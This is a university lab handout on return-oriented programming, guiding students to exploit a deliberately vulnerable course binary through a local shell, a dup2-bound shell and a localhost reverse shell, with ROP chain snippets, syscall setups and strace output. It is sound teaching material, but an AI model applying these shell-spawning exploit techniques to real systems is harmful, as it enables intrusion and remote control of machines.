# Lab1: ROP Exploits

|||
|---|---|
| Assigned | 2021-09-01 |
| Due: | 2021-09-16 |
| Points | 100 |

## Introduction

In other classes at UT, you should have already done a buffer overflow attack. In this lab, you will use
Return Oriented Programming to take over a program. You will be exploiting a vulnerable target program 
for which there is *no RWX page on which to place shellcode*. This means that you cannot send code
to be directly executed. Instead, you will have to use ROP in order to expolit existing executable code.
Your goal is to write three progressively more sophisticated return-oriented payloads.

As in the buffer overflow example, a 32-bit x86 machine running Linux was used to generate the `target` binary. This lab has been tested to work
on the CS linux machines. Alternatively, you can complete this lab on any 32-bit or 64-bit x86 machine running Linux.

In addition to the ROP reading for class, you may wish to google additional explanations and papers.

In the class github, you are given a statically linked, Linux (32-bit) binary called `target`, which is the target to exploit. For the purpose of this lab, you will not require to build target yourself, and are expected to use the binary provided in the assignment for all the three tasks. You will modify three python programs to send increasingly difficult exploits. You should aim to get the first two (local and dup) done in week 1. You are responsible for having good time management.

### The Vulnerability

The target is vulnerable to control-flow hijacking. The target program is designed to receive
incoming network TCP connections.
Once there is an incoming connection, `main` calls `handle_connection` to receive commands from the client, parse the commands and return the result.
However, there is a bug in the code and you can exploit it to trigger buffer overflow and hijack control flow.

Take a look at what `handle_connection` does.

```c
void handle_connection(int sock)
{
   char buffer[1024];
   ssize_t size = recv_line(sock, buffer, sizeof buffer);

   /* Match strings. */
   ...

   /* Send the response. */
   ...
}
```
It allocates a 1024-byte buffer and passes it to `recv_line`. `recv_line` will read bytes from the socket and store them into the buffer.
So let's take a deeper look at `recv_line`.

```c
static ssize_t recv_line(int sock, char *buffer, size_t buffer_size)
{
   size_t size = 0;
   while (size < buffer_size)
   {
      ssize_t amount = recv(sock, buffer, buffer_size + size, 0);
      
      ...
        
      size += amount;
      buffer += amount;
   }
   return size;
}
```

`recv_line` keeps reading bytes from the socket until the buffer is full. `size` is the number of bytes we have been read and `buffer` is moved forward accordingly. It looks plausible.
But if we carefully examine the arguments passed to `recv` function, we would find something interesting.

We know that the third argument is the size of the buffer.
In our case, we have a buffer whose original size is `buffer_size` and we have read `size` bytes, so the available size is `buffer_size - size`.
However, we made a mistake. We pass `buffer_size + size` as our third argument. It makes `recv` believe the buffer is longer than it actually is and `recv` will write bytes beyond the end of the buffer, which leads to buffer overflow vulnerability.

To trigger the vulnerability, we have to make `buffer_size + size` large enough so that we can overwrite the saved return address on the stack.
`buffer_size` is a constant 1024, and we cannot change it. Fortunately, we can change `size` by sending payload separately.
For example, we first send 1023 bytes. `size` will be updated to 1023, which is less than `buffer_size`, 1024, so the while loop keeps running.
This time `recv` is able to receive `buffer_size + size` bytes, that is 1024 + 1023 = 2047 bytes.

Unfortunately, we cannot manually flush the send buffer of a TCP connection. TCP decides on its own when to send data.
In practice, TCP sends data once its buffer is full or there is no new data for a long time. Therefore we can make our script sleep for a while after we send the first 1023 bytes to the TCP socket, and then send the second payload to the socket.

The code will look like this
```python
send_cmd("A"*1023)
time.sleep(1)
send_cmd(payload)
```

## Exploiting the Target

Using the overflow payload, you need to take control of the flow of control (e.g., overwrite the return address of
the function). Once you control the flow, you will begin to execute "gadgets" of already executable code in order
to exploit. GDB is your friend!

The assignment tarball also contains skeleton source for the exploits which you are to write. Unlike a regular buffer overflow, you will not inject shellcode into the target; instead, you will reuse instruction sequences in the target libc to induce desired behavior. All three exploits will attack the same target, but they will induce increasingly sophisticated behavior.

### Useful Instruction Sequences

For your return-oriented payloads, you will want to use instruction sequences in libc, the standard C library. We have included a dump of instructions in the target binary, whether intended or unintended. This list is in the lab directory as `gadgets.txt`. Note that you are not required to restrict yourself to these gadgets and are free to create gadgets of your own by analysing the assembly dump of target (Using `objdump -d target`).

Addresses in the leftmost column of `gadgets.txt` are addresses in the targe binary.

For example, the line

    0x080f1016: pop eax; ret; 

means that at address `0x080f1016` in target, you should find the instruction `pop eax` followed by the instruction `ret`. You can verify that by looking at the assembly dump of target.

Note that instructions here are presented in Intel notation, which in particular means that the destination operand is listed first. So, for example, the first instruction in

    0x080c219d: mov dword ptr [edx], eax ; ret

will store the contents of the `eax` register into the 4 bytes of memory whose address is in the `edx` register.

You MUST NOT use Ropper or other similar tools to build your exploit payloads—doing so by hand is key to this project. If you are caught doing so, you will receive a 0 on the assignment and referral to the University for cheating. We're serious about this.

### Executing System Calls

The code-reuse payloads you will write will need to make system calls. On 32-bit x86, the Linux kernel expects programs to make system calls as follows. 

1. To trap into the kernel, the program executes the `int 0x80` interrupt instruction. 
1. Before trapping into the kernel, it puts the system call number in the register `eax`. 
1. The first argument needs to be in `ebx`, the second argument in `ecx`, the third in `edx`, and so on.

### Task 1 - local.py

The first task is to exploit target and have it exec a shell. Conveniently, the tool that generated `gadgets.txt` has constructed such an exploit for us! Look at the bottom of gadgets.txt for this auto-generated payload. Please note, this part of the lab is practically done for you.

The constructed exploit uses struct.pack to build a binary string. See the documentation for details. You’re going to be using this function extensively.

Let’s take a look at the first few calls.

    p += pack('<I', 0x0808522a) # pop edx ; ret
    p += pack('<I', 0x08139060) # @ .data
    p += pack('<I', 0x080f1016) # pop eax ; ret
    p += '/bin'
    p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret

Each 4-byte word in the p string (payload string) is either the address of code to return to or some data. The first word, 0x0808522a is the address of the instructions pop edx ; ret, as noted in the comment. When target returns to this address, it will pop 0x08139060 into edx.

But what is that value and what does @ .data mean? If you run `readelf -S target`, you’ll see that the .data section starts at address 0x08139060. The payload generator has decided to use target’s writable data section as a place to write some data. In particular, this will write /bin at 0x08139060. You’ll want to keep this in mind for some of the other parts of the lab.

At this point, you should try to figure out what the rest of the code is doing. You can probably get away with not understanding this, but it’ll make the whole rest of the project easier if you figure this out now.

One final point about the generated shell code: The final 13 words clear eax, increment eax 11 times, and then run int 0x80. The autogenerating tool is avoiding zero-bytes, because this is often a problem with string operations (the zero byte indicates end-of-string). Since you are using sockets which can handle binary data, this isn’t a concern. Go ahead and replace the xor and the incs with a pop eax to load the appropriate value in eax.

The auto-generated code is designed to work with Python 2. Python 2 has reached its end-of-life. You will be writing Python 3 code. The place where this makes the biggest difference is the difference between str and bytes. All of the socket functions expect bytes. If you write '/bin', then you get a string. If you write b'/bin' then you get bytes.

To complete this task, modify local.py to:

* Exploit target and make it exec /bin/sh by overwriting the saved eip and the subsequent words on the stack with this return-oriented program. (Disassembling target using objdump -d target can help you figure out where the saved eip is relative to the start of the array.)

To test that everything works, run `./target <port>` in one shell and in another shell, run `python3 local.py <port>` (replace <port> which an actual port number). You should see a prompt appear below `/.target <port>`. You can run shell commands (e.g., `ls`) in this prompt. Type `exit` when done.

*Hint:* You’re going to want to remove essentially all of the skeleton code that is in local.py (and similarly for the other files). It just exists to show you how to use the socket api. In particular, you’re not going to want the send_cmd function, however, the loop for printing results may be useful in local.py and secret.py.

### Task 2 - dup.py

The first exploit was fun to do (I hope), but not terribly useful. After all, it opened a shell on the “remote” machine with no way to communicate with it! You’re going to fix that right now.

You need to connect target’s stdin, stdout, and stderr to the socket before you exec /bin/sh. Fortunately, that’s easy to do with the dup2(2) system call.

To make a system call, you need to know what to put in each register. Fortunately, [kernelgrok](https://web.archive.org/web/20200620014648/http://syscalls.kernelgrok.com/) is a great resource (the current version of the page appeared to serve malware, so this is an archive.org link to it). Search for dup2 to see what goes in each register.

One tricky aspect is you need to put the socket file descriptor in register ebx, but you can’t know what value to use until the exploit connects. Looking at the disassembly for target, you’ll see that the return value from accept(2) is stored in ebx in main and also on the stack just above the saved eip as the first argument to handle_connection. Unfortunately, you’re going to trash the saved ebx as well as the argument. All hope is not lost, run target in gdb and break near the end of handle_connection. Luckily, the socket file descriptor is available! (Hint: Look at the values in the registers using (gdb) info reg.)

In essence, you want to get the socket file descriptor that was returned from accept(2) in target—call it sock—and make the three system calls that correspond to

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

and then exec /bin/sh as you did in local.py.
   
(Hint : You have to make multiple system calls here. The gadgets defined in `gadgets.txt` are not sufficient for this. Look for additional gadgets in the assembly dump for the `target` program)

To complete this task, modify dup.py to:

* Exploit target and have it perform the dup2(2) system calls and exec the shell as described above;
* Read from stdin and write to the socket and read from the socket and write to stdout. You may find the console function in console.py useful for this task. Simply import the function using from console import console, pass the socket to console, and it should take care of everything. The prompt will not appear, but you can still enter commands and see the result.

To test that everything works, run ./target <port> in one shell and in another shell, run

    $ python3 dup.py <port>.
    INVALID COMMAND
    date
    Sun Oct 16 03:28:26 CDT 2016
    exit

The `strace` command will be really useful for tasks 2 and 3. Run the target binary as `strace ./target <port>` to see the actual code that
is being executed after overwriting the return address. This will help debug if you are making the correct system calls. For this task, the output after running strace should look something like this - 
    
    $ strace ./target <port>
    ...
    send(4, "INVALID COMMAND\r\n", 17, 0)   = 17
    dup2(4, 0)                              = 0
    dup2(4, 1)                              = 1
    dup2(4, 2)                              = 2
    execve("/bin//sh", [], [/* 3 vars */])  = 0
    ...
    read(0, "date\n", 8192)                 = 5
    ...
    read(0, "exit\n", 8192)                 = 5
    ...

### Task 3 - reverse.py

The exploit used in dup.py connected the shell to the socket we used to connect to target initially. For this task, the exploit will cause target to make a connection to remote server, connect the resultant socket to stdin/stdout/stderr (as was done in dup.py), and exec a shell.

Creating a new socket and making a connection involves making several system calls.

* socket(2)
* ccnnect(2)

There are several ways to call these functions. Since they appear in target, it’s possible to return to them with the arguments on the stack. However, the first argument to connect(2) is the return value from the socket(2) which makes making returning to the libc implementations difficult. Instead, you should make the corresponding system calls directly; just as you did with dup2(2).

See the associated manual pages for example usage and see the hints below for suggestions on making these system calls. And see the example below for the arguments to the system calls. The socket-related system calls all use the same system call number sys_socketcall. As described on kernelgrok, eax is set to 0x66. ebx is set to the actual socket call you want to make. Lastly, ecx points to an array of the arguments to pass.

To perform the socket(2) system call, you would need to set eax to 0x66, ebx to 0x1, and ecx as a pointer to a memory location (Can use @.data). The memory location pointed to by the ecx pointer should have the first 4 bytes as AF_NET (0x2), the next 4 bytes as SOCK_STREAM (0x1) and the last 4 bytes as 0x0 for the protocol. The return value of this system call will be stored in the eax register and will be used as one of the arguments to the connect(2) system call.

To perform the connect(2) system call, you would need to set eax to 0x66, ebx to 0x3, and ecx as a pointer to a memory location (Can use @.data).  The memory location pointed to by the ecx pointer should have the first 4 bytes as the socket file descriptor, which was returned earlier by the socket(2) system call, the next 4 bytes as yet another pointer to a memory location on the stack or the data segment (@. data) of the program, whichever works for you, (let's call this location L), and the remaining 4 bytes should be the size of the sockaddr struct, which is 0x10. The location L should have 8 bytes of data. You can use the following two lines directly in your payload, wherever you want to write the 8 bytes for memory location L. Here `<connect_port>` is the second argument that you provide to the reverse.py file.
 
    p += (socket.htons(2).to_bytes(2, 'big') + <connect_port>.to_bytes(2, 'big')) # AF_INET and PORT
    p += pack('<I', 0x0100007f) # Load the Localhost IP address

In essence you want to make the following system calls  :
    
    socket(PF_INET(0x2), SOCK_STREAM(0x1), IPPROTO_TCP(0x0)) = 5;
    connect(5, {sa_family=AF_INET(0x2), sin_port=htons(<connect_port>), sin_addr=inet_addr("127.0.0.1")}, 16) = 0;
    dup2(5, 0);
    dup2(5, 1);
    dup2(5, 2);
    execve("/bin//sh", [], [/* 6 vars */])
    
You can reuse code from previous tasks for the `dup2` and `execve` system calls.

The connection should be to 127.0.0.1 and the port should be specified as an argument to reverse.py (see example below).

To complete this task, modify reverse.py to:

* Open a socket to listen on 127.0.0.1 with the port specified as a command line parameter to reverse.py (see example below).
* Exploit target and have it make a new connection to 127.0.0.1 with the same port used in step 1. Once connected, target should exec a shell with stdin/stdout/stderr connected to the new socket.
* Read from stdin and write to the newly opened socket and read from the socket and write to stdout. Again, the console function may be helpful.

To test that everything works, run ./target <port> in one shell and in another shell, run

    $ python3 reverse.py <port> <connect_port>.
    date
    Sun Oct 16 03:47:33 CDT 2016
    exit

For this task, after running target as `strace ./target <port>`, the output should look something like this -
    
    $ strace ./target <port>
    ...
    send(4, "INVALID COMMAND\r\n", 17, 0)   = 17
    socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 5
    connect(5, {sa_family=AF_INET, sin_port=htons(<connect_port>), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
    dup2(5, 0)                              = 0
    dup2(5, 1)                              = 1
    dup2(5, 2)                              = 2
    execve("/bin//sh", [], [/* 6 vars */])  = 0
    ...
    read(0, "date\n", 8192)                 = 5
    ...
    read(0, "exit\n", 8192)                 = 5
    ...
    
## Summary of the Provided Code:

In the repo, you will find:

1. target
2. target.c
3. gadgets.txt (which includes rop code at the bottom for the first exploit)
4. local.py
5. dup.py
6. reverse.py

## Grading and Submission

Each student must make their own submission. 

Create a directory with your UT EID as the name. The directory should contain the following files : 

1. target
2. local.py
3. dup.py
4. reverse.py
5. report.pdf (Not required in every case. Read below for additional details)

Compress the directory as a `.zip` file (`UT-EID.zip`) and upload it on Canvas (`Assignments > Lab 1 : ROP Exploits`).

To receive full credit for the lab, you must complete all three exploits.

To receive 80% credit for the lab, you must complete Task 1 and Task 2 successfully. Additionally, for Task 3, you must ensure that your output while running `strace ./target <port>` in one terminal window, and sending the payload via `python3 reverse.py <port> <connect_port>` through another window is similar to the following :

    $ strace ./target <port>
    ...
    send(4, "INVALID COMMAND\r\n", 17, 0)   = 17
    socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 5
    connect(5, {sa_family=AF_INET, sin_port=htons(<connect_port>), sin_addr=inet_addr("127.0.0.1")}, 16) = ...
    ...
    ...

i.e, the socket and connect system calls are being performed with the correct arguments. It is alright if the other parts of the exploit don't work. Enclose a screenshot of this output in `report.pdf` and upload it along with the other files.
